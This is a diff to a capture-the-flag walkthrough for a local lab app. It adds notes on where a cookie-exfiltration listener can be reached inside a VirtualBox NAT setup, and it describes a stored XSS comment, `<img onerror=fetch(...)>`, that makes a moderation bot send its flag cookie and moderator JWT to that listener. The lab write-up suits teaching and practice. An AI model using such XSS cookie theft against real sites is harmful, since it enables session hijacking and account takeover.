@@ -1,6 +1,24 @@
 # Darkly — Mandatory Walkthrough
 
 **Target:** `http://localhost:4942` (FastAPI app) + `http://localhost:8090` (PocketBase admin API)
+
+**Environment — listener reachability (read before breaches 03/07):** the app
+and its moderation bot run inside a VirtualBox NAT VM while the operator's
+shell sits on the host. Probes arrive at the app from `10.0.2.2` (the
+VirtualBox NAT gateway address of the host), so any exfil listener
+(`xss-listener.py`) is reachable from the bot only at `10.0.2.2:<port>` —
+`127.0.0.1` works only when the bot and the operator share a network
+namespace. To re-detect the reachable address if the topology changes, use
+the built-in source-IP oracle:
+
+```bash
+m="probe-$(date +%s)"; curl -s "http://localhost:4942/api/collect?c=$m" > /dev/null
+curl -s "http://localhost:4942/api/collect" | \
+  python3 -c "import json,sys; print(next(e['from'] for e in json.load(sys.stdin)['captured'] if e['data']=='<marker>'))"
+```
+
+The bot's visit cadence observed in this env is **1–2 min**.
+
 **Goal:** recover 6 flags — 4 by escalating privileges step by step up to administrator (`god`) and on into the PocketBase superuser, plus 2 of choice.
 **Result: 6/6 flags** (7 recovered counting the spare flag from the IDOR `recovery_code` leak).
 **Result: 10/10 breaches**
@@ -108,7 +126,8 @@ Forum comments render user HTML unescaped ("HTML is supported"), and the
 moderation bot (headless Chrome inside the VM) visits new/updated threads with
 a live session and a **non-httpOnly `flag` cookie**. A one-time
 `<img onerror=fetch(...)>` comment makes the bot execute the payload and
-exfiltrate its cookies to our listener within ~2 min — the flag plus a live
+exfiltrate its cookies to our listener within 1–2 min (observed bot cadence —
+see the Environment note above) — the flag plus a live
 moderator JWT. Also the technical enabler of breach 3.
 
 ### Breach 8 — Reflected XSS newsletter banner
